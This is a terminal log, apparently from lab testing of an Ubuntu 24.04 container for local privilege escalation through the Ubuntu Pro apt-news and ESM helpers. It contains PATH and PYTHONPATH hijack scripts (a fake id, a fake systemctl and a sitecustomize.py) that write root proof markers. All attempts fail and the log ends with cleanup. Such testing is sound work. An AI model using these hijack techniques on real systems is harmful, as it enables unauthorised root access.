write /var/lib/ubuntu-advantage/user-config.json -> bash: line 1: /var/lib/ubuntu-advantage/user-config.json: Permission denied
write /var/lib/ubuntu-advantage/status.json -> bash: line 1: /var/lib/ubuntu-advantage/status.json: Permission denied
write /var/lib/ubuntu-advantage/messages/apt-news -> bash: line 1: /var/lib/ubuntu-advantage/messages/apt-news: No such file or directory
write /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list -> bash: line 1: /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list: Permission denied
write /run/ubuntu-advantage/apt-news/owned-by-user -> bash: line 1: /run/ubuntu-advantage/apt-news/owned-by-user: Permission denied
write /run/ubuntu-advantage/apt-news/aptnews.json -> bash: line 1: /run/ubuntu-advantage/apt-news/aptnews.json: Permission denied
write /var/cache/motd-news -> bash: line 1: /var/cache/motd-news: Permission denied
write /var/lib/apt/periodic/update-success-stamp -> bash: line 1: /var/lib/apt/periodic/update-success-stamp: Permission denied
symlink /run/ubuntu-advantage/user-link -> ln: failed to create symbolic link '/run/ubuntu-advantage/user-link': Permission denied
symlink /run/ubuntu-advantage/apt-news/user-link -> ln: failed to create symbolic link '/run/ubuntu-advantage/apt-news/user-link': Permission denied
symlink /var/lib/ubuntu-advantage/messages -> ln: failed to create symbolic link '/var/lib/ubuntu-advantage/messages': Permission denied

$ docker exec ubuntu24-server-lpe-target runuser -u selfauth -- bash -lc $'\nset +e\nprobe=ubuntu_pro_apt_news_probe\nu="$(id -un)"\nhome="$HOME/$probe"\nrm -rf "$home"\nmkdir -p "$home/bin" "$home/py"\ncat > "$home/bin/id" <<SH\n#!/bin/sh\n/usr/bin/id > /tmp/ubuntu_pro_apt_news_${u}_fake_id\nif [ "\\$(/usr/bin/id -u)" = "0" ]; then\n  /usr/bin/id > /root/ubuntu_pro_apt_news_lpe_proof\nfi\nexec /usr/bin/id "\\$@"\nSH\ncat > "$home/bin/systemctl" <<SH\n#!/bin/sh\n/usr/bin/id > /tmp/ubuntu_pro_apt_news_${u}_fake_systemctl\nif [ "\\$(/usr/bin/id -u)" = "0" ]; then\n  /usr/bin/id > /root/ubuntu_pro_apt_news_lpe_proof\nfi\nexit 0\nSH\ncat > "$home/py/sitecustomize.py" <<PY\nimport os\nmarker = "/tmp/ubuntu_pro_apt_news_${u}_sitecustomize"\nwith open(marker, "a", encoding="utf-8") as fh:\n    fh.write("uid=%s euid=%s argv=%r\\n" % (os.getuid(), os.geteuid(), __import__("sys").argv))\nif os.geteuid() == 0:\n    with open("/root/ubuntu_pro_apt_news_lpe_proof", "w", encoding="utf-8") as fh:\n        fh.write("python sitecustomize root execution\\n")\nPY\nchmod 755 "$home/bin/id" "$home/bin/systemctl"\necho "== hostile PATH/PYTHONPATH direct helper execution =="\necho "helper_home=$home"\nfor cmd in \\\n  "PATH=$home/bin:\\$PATH PYTHONPATH=$home/py pro status --format json" \\\n  "PATH=$home/bin:\\$PATH PYTHONPATH=$home/py pro refresh" \\\n  "PATH=$home/bin:\\$PATH PYTHONPATH=$home/py /usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py" \\\n  "PATH=$home/bin:\\$PATH PYTHONPATH=$home/py /usr/lib/ubuntu-advantage/esm_cache.py" \\\n  "PATH=$home/bin:\\$PATH CACHE=/tmp/ubuntu_pro_apt_news_${u}_motd_cache /etc/update-motd.d/50-motd-news" \\\n  "PATH=$home/bin:\\$PATH /etc/update-motd.d/91-contract-ua-esm-status" \\\n  "PATH=$home/bin:\\$PATH apt-get update" \\\n  "PATH=$home/bin:\\$PATH apt -s upgrade"; do\n  echo "### $cmd"\n  timeout 35s bash -lc "$cmd" >/tmp/ubuntu_pro_apt_news_${u}_cmd.out \\\n    2>/tmp/ubuntu_pro_apt_news_${u}_cmd.err\n  rc=$?\n  echo "rc=$rc"\n  sed -n "1,40p" /tmp/ubuntu_pro_apt_news_${u}_cmd.out\n  sed -n "1,40p" /tmp/ubuntu_pro_apt_news_${u}_cmd.err\ndone\necho "== hostile-env markers for $u =="\nfor p in /tmp/ubuntu_pro_apt_news_${u}_fake_id \\\n  /tmp/ubuntu_pro_apt_news_${u}_fake_systemctl \\\n  /tmp/ubuntu_pro_apt_news_${u}_sitecustomize \\\n  /tmp/ubuntu_pro_apt_news_${u}_motd_cache; do\n  if [ -e "$p" ]; then\n    stat -Lc "%A %U:%G %n" "$p"\n    sed -n "1,20p" "$p" 2>/dev/null || true\n  else\n    echo "MISSING $p"\n  fi\ndone\nrm -f /tmp/ubuntu_pro_apt_news_${u}_cmd.out /tmp/ubuntu_pro_apt_news_${u}_cmd.err\n'
== hostile PATH/PYTHONPATH direct helper execution ==
helper_home=/home/selfauth/ubuntu_pro_apt_news_probe
### PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:$PATH PYTHONPATH=/home/selfauth/ubuntu_pro_apt_news_probe/py pro status --format json
rc=0
{"_doc": "Content provided in json response is currently considered Experimental and may change", "_schema_version": "0.1", "account": {"created_at": "", "external_account_ids": [], "id": "", "name": ""}, "attached": false, "config": {"contract_url": "https://contracts.canonical.com", "data_dir": "/var/lib/ubuntu-advantage", "log_file": "/var/log/ubuntu-advantage.log", "log_level": "debug", "security_url": "https://ubuntu.com/security", "ua_config": {"apt_http_proxy": null, "apt_https_proxy": null, "apt_news": true, "apt_news_url": "https://motd.ubuntu.com/aptnews.json", "global_apt_http_proxy": null, "global_apt_https_proxy": null, "http_proxy": null, "https_proxy": null, "lxd_guest_attach": "off", "metering_timer": 14400, "poll_for_pro_license": null, "polling_error_retry_delay": null, "ua_apt_http_proxy": null, "ua_apt_https_proxy": null, "update_messaging_timer": 21600, "vulnerability_data_url_prefix": "https://security-metadata.canonical.com/oval/"}}, "config_path": "/etc/ubuntu-advantage/uaclient.conf", "contract": {"created_at": "", "id": "", "name": "", "products": [], "tech_support_level": "n/a"}, "effective": null, "environment_vars": [], "errors": [], "execution_details": "No Ubuntu Pro operations are running", "execution_status": "inactive", "expires": null, "features": {}, "machine_id": null, "notices": [], "result": "success", "services": [{"available": "yes", "description": "Scalable Android in the cloud", "description_override": null, "name": "anbox-cloud"}, {"available": "yes", "description": "Expanded Security Maintenance for Applications", "description_override": null, "name": "esm-apps"}, {"available": "yes", "description": "Expanded Security Maintenance for Infrastructure", "description_override": null, "name": "esm-infra"}, {"available": "yes", "description": "FIPS compliant crypto packages with stable security updates", "description_override": null, "name": "fips-updates"}, {"available": "yes", "description": "Management and administration tool for Ubuntu", "description_override": null, "name": "landscape"}, {"available": "yes", "description": "Ubuntu kernel with PREEMPT_RT patches integrated", "description_override": null, "name": "realtime-kernel"}, {"available": "yes", "description": "Security compliance and audit tools", "description_override": null, "name": "usg"}], "simulated": false, "version": "37.2ubuntu~24.04", "warnings": []}
### PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:$PATH PYTHONPATH=/home/selfauth/ubuntu_pro_apt_news_probe/py pro refresh
rc=1
This command must be run as root (try using sudo).
### PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:$PATH PYTHONPATH=/home/selfauth/ubuntu_pro_apt_news_probe/py /usr/bin/python3 /usr/lib/ubuntu-advantage/apt_news.py
rc=0
### PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:$PATH PYTHONPATH=/home/selfauth/ubuntu_pro_apt_news_probe/py /usr/lib/ubuntu-advantage/esm_cache.py
rc=0
["2026-05-16T17:21:27.751", "WARNING", "ubuntupro.apt", "update_esm_caches", 978, "Failed to fetch the ESM Apt Cache: E:Could not open lock file /var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/lock - open (13: Permission denied), E:Unable to lock directory /var/lib/ubuntu-advantage/apt-esm/var/lib/apt/lists/", {}]
### PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:$PATH CACHE=/tmp/ubuntu_pro_apt_news_selfauth_motd_cache /etc/update-motd.d/50-motd-news
rc=0
### PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:$PATH /etc/update-motd.d/91-contract-ua-esm-status
rc=0
### PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:$PATH apt-get update
rc=100
Reading package lists...
E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
E: Unable to lock directory /var/lib/apt/lists/
### PATH=/home/selfauth/ubuntu_pro_apt_news_probe/bin:$PATH apt -s upgrade
rc=0
NOTE: This is only a simulation!
      apt needs root privileges for real execution.
      Keep also in mind that locking is deactivated,
      so don't depend on the relevance to the real current situation!
Reading package lists...
Building dependency tree...
Reading state information...
Calculating upgrade...
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

== hostile-env markers for selfauth ==
-rw-r--r-- selfauth:selfauth /tmp/ubuntu_pro_apt_news_selfauth_fake_id
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
MISSING /tmp/ubuntu_pro_apt_news_selfauth_fake_systemctl
-rw-r--r-- selfauth:selfauth /tmp/ubuntu_pro_apt_news_selfauth_sitecustomize
uid=1002 euid=1002 argv=['/usr/bin/pro', 'status', '--format', 'json']
uid=1002 euid=1002 argv=['/usr/bin/pro', 'refresh']
uid=1002 euid=1002 argv=['/usr/lib/ubuntu-advantage/apt_news.py']
uid=1002 euid=1002 argv=['/usr/lib/ubuntu-advantage/esm_cache.py']
MISSING /tmp/ubuntu_pro_apt_news_selfauth_motd_cache

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset +e\necho "== root apt/update trigger with user hostile dirs present =="\necho "system manager environment before trigger:"\nsystemctl show-environment 2>/dev/null | grep -E "^(PATH|PYTHONPATH|UA_DATA_DIR)=" || true\ntimeout 45s systemctl start apt-news.service esm-cache.service 2>&1\necho "systemctl_start_rc=$?"\ntimeout 120s apt-get update 2>&1\necho "apt_get_update_rc=$?"\nsleep 3\nsystemctl status --no-pager apt-news.service esm-cache.service | sed -n "1,140p"\njournalctl -u apt-news.service -u esm-cache.service --no-pager -n 80 2>/dev/null || true\necho\necho "== post-root-trigger state modes =="\nfor p in /run/ubuntu-advantage /run/ubuntu-advantage/apt-news \\\n  /run/ubuntu-advantage/apt-news/aptnews.json \\\n  /var/lib/ubuntu-advantage /var/lib/ubuntu-advantage/status.json \\\n  /var/lib/ubuntu-advantage/user-config.json \\\n  /var/lib/ubuntu-advantage/messages \\\n  /var/lib/ubuntu-advantage/messages/apt-news \\\n  /var/lib/ubuntu-advantage/messages/apt-news-raw \\\n  /var/lib/ubuntu-advantage/apt-esm \\\n  /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list \\\n  /var/lib/ubuntu-advantage/apt-esm/var/lib/dpkg/status \\\n  /var/lib/apt/periodic/update-success-stamp; do\n  if [ -e "$p" ] || [ -L "$p" ]; then\n    stat -Lc "%A %a %U:%G %F %n -> %N" "$p"\n  else\n    echo "MISSING $p"\n  fi\ndone\necho\necho "== symlink inventory under Pro state =="\nfind /run/ubuntu-advantage /var/lib/ubuntu-advantage -maxdepth 4 -type l -ls 2>/dev/null || true\necho\necho "== root-side PAM/login MOTD environment probe =="\nif [ -d /home/attacker/ubuntu_pro_apt_news_probe ]; then\n  printf "exit\\n" >/tmp/ubuntu_pro_apt_news_login_input\n  timeout 25s script -q -e -c "env PATH=/home/attacker/ubuntu_pro_apt_news_probe/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PYTHONPATH=/home/attacker/ubuntu_pro_apt_news_probe/py CACHE=/tmp/ubuntu_pro_apt_news_login_cache /bin/login -p -f selfauth" /dev/null \\\n    </tmp/ubuntu_pro_apt_news_login_input 2>&1 | sed -n "1,90p"\n  echo "login_pipe_rc=${PIPESTATUS[0]}"\nfi\nfor p in /tmp/ubuntu_pro_apt_news_attacker_fake_id \\\n  /tmp/ubuntu_pro_apt_news_attacker_fake_systemctl \\\n  /tmp/ubuntu_pro_apt_news_attacker_sitecustomize \\\n  /tmp/ubuntu_pro_apt_news_login_cache \\\n  /root/ubuntu_pro_apt_news_lpe_proof; do\n  if [ -e "$p" ]; then\n    stat -Lc "%A %U:%G %n" "$p"\n    sed -n "1,20p" "$p" 2>/dev/null || true\n  else\n    echo "MISSING $p"\n  fi\ndone\necho\necho "== attacker write retry after root apt-news cache exists =="\nrunuser -u attacker -- bash -lc \'\nfor p in /run/ubuntu-advantage/apt-news/post-root-write \\\n  /run/ubuntu-advantage/apt-news/aptnews.json \\\n  /var/lib/ubuntu-advantage/status.json \\\n  /var/lib/ubuntu-advantage/apt-esm/var/lib/dpkg/status; do\n  printf "write %s -> " "$p"\n  err=/tmp/ubuntu_pro_apt_news_post_write.err\n  if bash -c "printf x > \\"\\$1\\"" bash "$p" 2>"$err"; then\n    echo OK\n    rm -f "$p"\n  else\n    sed -n "1p" "$err"\n  fi\n  rm -f "$err"\ndone\n\'\necho\necho "== root proof check =="\nif [ -e /root/ubuntu_pro_apt_news_lpe_proof ]; then\n  echo "ROOT_PROOF_PRESENT"\n  stat -Lc "%A %U:%G %n" /root/ubuntu_pro_apt_news_lpe_proof\n  cat /root/ubuntu_pro_apt_news_lpe_proof\nelse\n  echo "ROOT_PROOF_ABSENT"\nfi\n'
== root apt/update trigger with user hostile dirs present ==
system manager environment before trigger:
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
systemctl_start_rc=0
Hit:1 http://ports.ubuntu.com/ubuntu-ports noble InRelease
Hit:2 http://ports.ubuntu.com/ubuntu-ports noble-updates InRelease
Hit:3 http://ports.ubuntu.com/ubuntu-ports noble-backports InRelease
Hit:4 http://ports.ubuntu.com/ubuntu-ports noble-security InRelease
Reading package lists...
apt_get_update_rc=0
○ apt-news.service - Update APT News
     Loaded: loaded (/usr/lib/systemd/system/apt-news.service; static)
     Active: inactive (dead)

May 16 17:20:39 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.
May 16 17:20:40 4f5b414436ae systemd[1]: Starting apt-news.service - Update APT News...
May 16 17:20:40 4f5b414436ae systemd[1]: apt-news.service: Deactivated successfully.
May 16 17:20:40 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.
May 16 17:21:30 4f5b414436ae systemd[1]: Starting apt-news.service - Update APT News...
May 16 17:21:30 4f5b414436ae systemd[1]: apt-news.service: Deactivated successfully.
May 16 17:21:30 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.
May 16 17:21:30 4f5b414436ae systemd[1]: Starting apt-news.service - Update APT News...
May 16 17:21:30 4f5b414436ae systemd[1]: apt-news.service: Deactivated successfully.
May 16 17:21:30 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.

○ esm-cache.service - Update the local ESM caches
     Loaded: loaded (/usr/lib/systemd/system/esm-cache.service; static)
     Active: inactive (dead)

May 16 17:20:40 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.
May 16 17:20:40 4f5b414436ae systemd[1]: Starting esm-cache.service - Update the local ESM caches...
May 16 17:20:40 4f5b414436ae systemd[1]: esm-cache.service: Deactivated successfully.
May 16 17:20:40 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.
May 16 17:21:30 4f5b414436ae systemd[1]: Starting esm-cache.service - Update the local ESM caches...
May 16 17:21:30 4f5b414436ae systemd[1]: esm-cache.service: Deactivated successfully.
May 16 17:21:30 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.
May 16 17:21:30 4f5b414436ae systemd[1]: Starting esm-cache.service - Update the local ESM caches...
May 16 17:21:30 4f5b414436ae systemd[1]: esm-cache.service: Deactivated successfully.
May 16 17:21:30 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.
May 16 17:14:57 4f5b414436ae systemd[1]: Starting apt-news.service - Update APT News...
May 16 17:14:57 4f5b414436ae systemd[1]: Starting esm-cache.service - Update the local ESM caches...
May 16 17:14:57 4f5b414436ae python3[742977]: ["2026-05-16T17:14:57.104", "INFO", "ubuntupro.system", "get_cpu_info", 296, "could not open /proc/sysinfo", {}]
May 16 17:14:57 4f5b414436ae python3[742977]: ["2026-05-16T17:14:57.104", "INFO", "ubuntupro.system", "get_cpu_info", 306, "could not open /sys/firmware/devicetree/base/model", {}]
May 16 17:14:57 4f5b414436ae python3[742977]: ["2026-05-16T17:14:57.104", "WARNING", "ubuntupro.system", "get_kernel_info", 166, "failed to process /proc/version_signature.", {}]
May 16 17:14:57 4f5b414436ae python3[742977]: ["2026-05-16T17:14:57.105", "WARNING", "ubuntupro.system", "get_kernel_info", 175, "Failed to parse kernel: 6.10.14-linuxkit", {}]
May 16 17:14:57 4f5b414436ae python3[742977]: ["2026-05-16T17:14:57.468", "WARNING", "ubuntupro.livepatch", "on_supported_kernel", 334, "unable to determine enough kernel information to check livepatch support", {}]
May 16 17:14:57 4f5b414436ae systemd[1]: apt-news.service: Deactivated successfully.
May 16 17:14:57 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.
May 16 17:14:58 4f5b414436ae systemd[1]: esm-cache.service: Deactivated successfully.
May 16 17:14:58 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.
May 16 17:20:39 4f5b414436ae systemd[1]: Starting apt-news.service - Update APT News...
May 16 17:20:39 4f5b414436ae systemd[1]: Starting esm-cache.service - Update the local ESM caches...
May 16 17:20:39 4f5b414436ae systemd[1]: apt-news.service: Deactivated successfully.
May 16 17:20:39 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.
May 16 17:20:40 4f5b414436ae systemd[1]: esm-cache.service: Deactivated successfully.
May 16 17:20:40 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.
May 16 17:20:40 4f5b414436ae systemd[1]: Starting apt-news.service - Update APT News...
May 16 17:20:40 4f5b414436ae systemd[1]: Starting esm-cache.service - Update the local ESM caches...
May 16 17:20:40 4f5b414436ae systemd[1]: apt-news.service: Deactivated successfully.
May 16 17:20:40 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.
May 16 17:20:40 4f5b414436ae systemd[1]: esm-cache.service: Deactivated successfully.
May 16 17:20:40 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.
May 16 17:21:30 4f5b414436ae systemd[1]: Starting apt-news.service - Update APT News...
May 16 17:21:30 4f5b414436ae systemd[1]: Starting esm-cache.service - Update the local ESM caches...
May 16 17:21:30 4f5b414436ae systemd[1]: apt-news.service: Deactivated successfully.
May 16 17:21:30 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.
May 16 17:21:30 4f5b414436ae systemd[1]: esm-cache.service: Deactivated successfully.
May 16 17:21:30 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.
May 16 17:21:30 4f5b414436ae systemd[1]: Starting apt-news.service - Update APT News...
May 16 17:21:30 4f5b414436ae systemd[1]: Starting esm-cache.service - Update the local ESM caches...
May 16 17:21:30 4f5b414436ae systemd[1]: apt-news.service: Deactivated successfully.
May 16 17:21:30 4f5b414436ae systemd[1]: Finished apt-news.service - Update APT News.
May 16 17:21:30 4f5b414436ae systemd[1]: esm-cache.service: Deactivated successfully.
May 16 17:21:30 4f5b414436ae systemd[1]: Finished esm-cache.service - Update the local ESM caches.

== post-root-trigger state modes ==
drwxr-xr-x 755 root:root directory /run/ubuntu-advantage -> '/run/ubuntu-advantage'
drwxr-xr-x 755 _apt:root directory /run/ubuntu-advantage/apt-news -> '/run/ubuntu-advantage/apt-news'
-rw-r--r-- 644 root:root regular file /run/ubuntu-advantage/apt-news/aptnews.json -> '/run/ubuntu-advantage/apt-news/aptnews.json'
drwxr-xr-x 755 root:root directory /var/lib/ubuntu-advantage -> '/var/lib/ubuntu-advantage'
-rw-r--r-- 644 root:root regular file /var/lib/ubuntu-advantage/status.json -> '/var/lib/ubuntu-advantage/status.json'
MISSING /var/lib/ubuntu-advantage/user-config.json
MISSING /var/lib/ubuntu-advantage/messages
MISSING /var/lib/ubuntu-advantage/messages/apt-news
MISSING /var/lib/ubuntu-advantage/messages/apt-news-raw
drwxr-xr-x 755 root:root directory /var/lib/ubuntu-advantage/apt-esm -> '/var/lib/ubuntu-advantage/apt-esm'
-rw-r--r-- 644 root:root regular empty file /var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list -> '/var/lib/ubuntu-advantage/apt-esm/etc/apt/sources.list'
-rw-r--r-- 644 root:root regular empty file /var/lib/ubuntu-advantage/apt-esm/var/lib/dpkg/status -> '/var/lib/ubuntu-advantage/apt-esm/var/lib/dpkg/status'
-rw-r--r-- 644 root:root regular empty file /var/lib/apt/periodic/update-success-stamp -> '/var/lib/apt/periodic/update-success-stamp'

== symlink inventory under Pro state ==

== root-side PAM/login MOTD environment probe ==
exit
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.10.14-linuxkit aarch64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat May 16 17:20:44 UTC 2026

  System load:    0.5       Processes:             33
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   16%       IPv4 address for eth0: 172.17.0.2
  Swap usage:     0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


selfauth@4f5b414436ae:~$ exit
logout
login_pipe_rc=0
-rw-r--r-- attacker:attacker /tmp/ubuntu_pro_apt_news_attacker_fake_id
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
MISSING /tmp/ubuntu_pro_apt_news_attacker_fake_systemctl
-rw-r--r-- attacker:attacker /tmp/ubuntu_pro_apt_news_attacker_sitecustomize
uid=1001 euid=1001 argv=['/usr/bin/pro', 'status', '--format', 'json']
uid=1001 euid=1001 argv=['/usr/bin/pro', 'refresh']
uid=1001 euid=1001 argv=['/usr/lib/ubuntu-advantage/apt_news.py']
uid=1001 euid=1001 argv=['/usr/lib/ubuntu-advantage/esm_cache.py']
MISSING /tmp/ubuntu_pro_apt_news_login_cache
MISSING /root/ubuntu_pro_apt_news_lpe_proof

== attacker write retry after root apt-news cache exists ==
write /run/ubuntu-advantage/apt-news/post-root-write -> bash: line 1: /run/ubuntu-advantage/apt-news/post-root-write: Permission denied
write /run/ubuntu-advantage/apt-news/aptnews.json -> bash: line 1: /run/ubuntu-advantage/apt-news/aptnews.json: Permission denied
write /var/lib/ubuntu-advantage/status.json -> bash: line 1: /var/lib/ubuntu-advantage/status.json: Permission denied
write /var/lib/ubuntu-advantage/apt-esm/var/lib/dpkg/status -> bash: line 1: /var/lib/ubuntu-advantage/apt-esm/var/lib/dpkg/status: Permission denied

== root proof check ==
ROOT_PROOF_ABSENT

$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset +e\necho "== cleanup after probe =="\nrm -rf /tmp/ubuntu_pro_apt_news_probe* /tmp/ubuntu_pro_apt_news_* \\\n  /home/attacker/ubuntu_pro_apt_news_probe \\\n  /home/selfauth/ubuntu_pro_apt_news_probe 2>/dev/null || true\nrm -f /root/ubuntu_pro_apt_news_lpe_proof /root/ubuntu_pro_apt_news_* 2>/dev/null || true\necho "root_marker_absent_after_cleanup=$([ ! -e /root/ubuntu_pro_apt_news_lpe_proof ] && echo yes || echo no)"\nsystemctl is-system-running 2>&1 || true\nsystemctl --failed --no-pager 2>&1 || true\n'
== cleanup after probe ==
root_marker_absent_after_cleanup=yes
running
  UNIT LOAD ACTIVE SUB DESCRIPTION

0 loaded units listed.
